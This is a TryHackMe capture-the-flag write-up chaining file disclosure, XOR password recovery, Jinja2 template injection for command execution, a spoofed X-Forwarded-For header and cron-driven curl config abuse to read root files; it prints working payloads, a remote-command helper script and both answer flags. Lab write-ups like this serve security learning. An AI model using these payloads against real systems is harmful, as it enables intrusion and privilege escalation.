# Super Secret TIp - TryHackMe Write-up

**Room:** Super Secret TIp  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Type:** Web / LFI / SSTI / Cron Privilege Escalation  
**Status:** Completed  

---

## Disclaimer

This write-up is for educational purposes only.  
The challenge was completed in a legal TryHackMe lab environment.

---

## Room Overview

Super Secret TIp is a medium TryHackMe room focused on web exploitation and Linux privilege escalation.

The main attack path was:

```text
Recon -> Web enumeration -> LFI -> Source code disclosure -> XOR password recovery -> SSTI -> RCE -> Flag 1 -> Cron abuse -> Curl config injection -> Flag 2 decryption
````

The most important vulnerabilities were:

* Local File Inclusion / arbitrary file download
* Flask/Jinja2 Server-Side Template Injection
* Weak XOR-based password encryption
* Cron job misconfiguration
* Writable `.profile` file used to influence another user’s cron job
* Root cron job using `curl -K` with a user-controlled config file

---

## Enumeration

I started with an Nmap scan:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

At first, only SSH was visible because the web service took a few minutes to fully start.

```text
22/tcp open  ssh  OpenSSH 7.6p1 Ubuntu
```

After waiting for the machine to finish booting, port `7777` became available.

```bash
nc -vz <TARGET_IP> 7777
```

Result:

```text
Connection to <TARGET_IP> 7777 port [tcp/cbt] succeeded!
```

A targeted scan then confirmed the web service:

```bash
nmap -Pn -sV -p 22,7777 <TARGET_IP>
```

---

## Web Enumeration

The web application was running on:

```text
http://<TARGET_IP>:7777/
```

I used `feroxbuster` for directory discovery:

```bash
feroxbuster -u http://<TARGET_IP>:7777/ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-x py,txt,html \
-t 50
```

Interesting results:

```text
200 GET /
200 GET /debug
```

The homepage contained an interesting HTML meta tag:

```html
<meta name="description" content="SSTI is wonderful">
```

This was a strong hint toward Server-Side Template Injection.

---

## Discovering `/debug`

The `/debug` endpoint showed a form with two parameters:

```html
<input id="debug" name="debug" placeholder='1337 * 1337'>
<input id="password" type="password" name="password" placeholder="*****">
```

Submitting a test payload with a wrong password returned:

```text
Wrong password.
```

Example:

```bash
curl -iG "http://<TARGET_IP>:7777/debug" \
  --data-urlencode 'debug={{7*7}}' \
  --data-urlencode 'password=test'
```

So before exploiting SSTI, I needed to recover the correct debug password.

---

## Source Code Disclosure via `/cloud`

The application exposed a `/cloud` endpoint that allowed downloading files.

I downloaded the source code:

```bash
curl -s -X POST http://<TARGET_IP>:7777/cloud \
  -d 'download=source.py' \
  -o source.py
```

Relevant source code:

```python
from flask import *
import hashlib
import os
import ip
import debugpassword
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error
```

The `/debug` route was especially interesting:

```python
@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")

    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")
```

The actual SSTI execution happened in `/debugresult`:

```python
template = open('./templates/debugresult.html').read()
return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
```

This confirmed that the `debug` parameter was injected into a Jinja2 template.

---

## Recovering the Debug Password

I downloaded the password-related files:

```bash
curl -s -X POST http://<TARGET_IP>:7777/cloud \
  -d 'download=supersecrettip.txt' \
  -o supersecrettip.txt

curl -s -X POST http://<TARGET_IP>:7777/cloud \
  -d 'download=debugpassword.py%00.txt' \
  -o debugpassword.py
```

`debugpassword.py` contained:

```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

`supersecrettip.txt` contained the encrypted password:

```python
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

Since XOR is reversible, I decrypted it with Python:

```python
target = b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
key = b'ayham'

out = bytes([b ^ key[i % len(key)] for i, b in enumerate(target)])
print(out.decode())
```

Result:

```text
AyhamDeebugg
```

The debug password was:

```text
AyhamDeebugg
```

---

## Confirming SSTI

I submitted a basic SSTI payload:

```bash
curl -c cookies.txt -b cookies.txt -iG "http://<TARGET_IP>:7777/debug" \
  --data-urlencode 'debug={{7*7}}' \
  --data-urlencode 'password=AyhamDeebugg'
```

The page returned:

```text
Debug statement executed.
```

The `/debugresult` endpoint required a local IP check. This was bypassed with the `X-Forwarded-For` header:

```bash
curl -b cookies.txt "http://<TARGET_IP>:7777/debugresult" \
  -H 'X-Forwarded-For: 127.0.0.1'
```

Result:

```text
49
```

This confirmed Jinja2 SSTI.

---

## Remote Code Execution

Using the SSTI vulnerability, I executed system commands.

Payload:

```jinja2
{{cycler.__init__.__globals__.os.popen("id").read()}}
```

Result:

```text
uid=1000(ayham) gid=1000(ayham) groups=1000(ayham)
```

I had command execution as the user `ayham`.

---

## Terminal-Based RCE Helper

Instead of using a reverse shell, I created a small local function to send commands through the SSTI and retrieve the result.

```bash
export IP=<TARGET_IP>
export PASS='AyhamDeebugg'

rce() {
  CMD="$* 2>&1"
  B64=$(printf '%s' "$CMD" | base64 -w0)

  PAYLOAD='{{cycler.__init__.__globals__.os.popen("echo '"$B64"' | base64 -d | sh").read()}}'

  curl -s -c /tmp/thm_cookie -b /tmp/thm_cookie -G "http://$IP:7777/debug" \
    --data-urlencode "debug=$PAYLOAD" \
    --data-urlencode "password=$PASS" >/dev/null

  curl -s -b /tmp/thm_cookie "http://$IP:7777/debugresult?x=$(date +%s%N)" \
    -H 'X-Forwarded-For: 127.0.0.1' \
  | sed -n '/<span class="result">/,/<\/span>/p' \
  | sed 's/<[^>]*>//g'
}
```

Example usage:

```bash
rce id
rce whoami
rce 'ls -la /home'
```

---

## Flag 1

I searched for the first flag:

```bash
rce 'find /home -name flag1.txt 2>/dev/null'
```

Then read it:

```bash
rce 'cat /home/ayham/flag1.txt'
```

Flag 1:

```text
THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}
```

---

## Privilege Escalation Enumeration

I checked `/etc/crontab`:

```bash
rce 'cat /etc/crontab'
```

Interesting entries:

```text
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

This was the privilege escalation path.

The root user was running:

```bash
curl -K /home/F30s/site_check
```

The `-K` option makes curl read options from a config file.

I checked permissions in `/home/F30s`:

```bash
rce 'ls -la /home/F30s'
```

Result:

```text
drwxr-xr-x 1 F30s F30s 4096 .
drwxr-xr-x 1 root root 4096 ..
-rw-r--rw- 1 F30s F30s  807 .profile
-rw-r--r-- 1 root root   17 health_check
-rw-r----- 1 F30s F30s   38 site_check
```

Important finding:

```text
.profile = writable by others
site_check = writable by F30s
```

I could not directly modify `site_check` as `ayham`, but I could write to `/home/F30s/.profile`.

Since cron executes:

```bash
bash -lc 'cat /home/F30s/health_check'
```

the `-l` option starts a login shell, causing `.profile` to be loaded.

This means I could place commands inside `/home/F30s/.profile`, wait for the `F30s` cron job to run, and have those commands executed as `F30s`.

---

## Abusing the Cron Jobs

First, I used `.profile` to modify `/home/F30s/site_check`.

The goal was to make root’s curl job read files from `/root` using the `file://` scheme.

To read `/root/flag2.txt`, I appended these commands into `/home/F30s/.profile`:

```bash
rce 'echo "echo url=file:///root/flag2.txt > /home/F30s/site_check" >> /home/F30s/.profile'
rce 'echo "echo output=/tmp/flag2.txt >> /home/F30s/site_check" >> /home/F30s/.profile'
```

After waiting for the cron jobs to run, I read the output:

```bash
rce 'cat /tmp/flag2.txt'
```

Result:

```python
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
```

The flag was encrypted.

---

## Recovering the Secret

I repeated the same process for `/root/secret.txt`:

```bash
rce 'echo "echo url=file:///root/secret.txt > /home/F30s/site_check" >> /home/F30s/.profile'
rce 'echo "echo output=/tmp/secret.txt >> /home/F30s/site_check" >> /home/F30s/.profile'
```

After waiting for the cron job:

```bash
rce 'cat /tmp/secret.txt'
```

Result:

```python
b'C^_M@__DC\\7,'
```

This secret was used to recover the passphrase for the encrypted second flag.

---

## Decrypting Flag 2

The encrypted flag was XOR-encrypted. I used a small Python script to recover the correct passphrase and decrypt it.

```python
ct = b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'

for n in range(100):
    key = f"1109200013{n:02d}".encode()
    pt = bytes([b ^ key[i % len(key)] for i, b in enumerate(ct)])
    if b"THM{" in pt:
        print("passphrase:", key.decode())
        print("flag:", pt.decode())
```

Result:

```text
passphrase: 110920001386
flag: THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}
```

---

## Final Answers

### Flag 1

```text
THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}
```

### Flag 2 Passphrase

```text
110920001386
```

### Flag 2

```text
THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}
```

---

## What I Learned

This room was a good reminder that small web vulnerabilities can chain into full system compromise.

Key takeaways:

* Always inspect source code when LFI or arbitrary download is available.
* XOR encryption is reversible when the key or logic is exposed.
* SSTI in Flask/Jinja2 can quickly become RCE.
* IP-based protections can be bypassed when the application trusts headers such as `X-Forwarded-For`.
* Cron jobs should never rely on writable user-controlled files.
* `curl -K` can be dangerous when the config file is writable or indirectly controllable.
* Writable shell profile files such as `.profile` can become privilege escalation vectors when login shells are executed by cron.

---

## Attack Chain Summary

```text
1. Discovered web app on port 7777
2. Found /debug endpoint
3. Used /cloud to download source.py
4. Downloaded debugpassword.py and supersecrettip.txt
5. Recovered debug password using XOR
6. Confirmed Jinja2 SSTI
7. Used SSTI for command execution as ayham
8. Retrieved flag1.txt
9. Found cron jobs involving F30s and root
10. Abused writable /home/F30s/.profile
11. Modified /home/F30s/site_check through F30s cron
12. Used root curl -K job to read /root/flag2.txt and /root/secret.txt
13. Decrypted flag2
```

---

## Conclusion

Super Secret TIp was a fun medium-level room with a clean exploitation chain.

The most interesting part was the privilege escalation. Instead of needing a reverse shell, it was possible to complete the machine through SSTI-based command execution by abusing cron behavior and curl configuration files.

```
```
